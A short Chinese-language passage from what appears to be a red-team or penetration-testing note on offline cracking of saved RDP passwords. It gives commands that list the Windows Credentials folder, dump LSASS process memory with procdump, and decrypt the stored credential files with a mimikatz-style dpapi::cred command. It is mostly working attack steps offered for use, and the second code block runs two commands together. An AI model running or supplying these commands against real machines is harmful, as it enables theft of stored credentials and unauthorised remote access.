**离线破解RDP连接密码：**  
查看是否存在凭证：

```
dir /a %userprofile%\\AppData\\Local\\Microsoft\\Credentials\\\*

```

  
![](../Images/775ea2e650776df271fe8d11b505ff37.png)打包对应文件到本地，获取对应连接记录的guidMasterKey：  

```

procdump64.exe -accepteula -ma lsass.exe lsass.dmp\# dpapi::cred /in:<Credentials文件凭证路径>

```
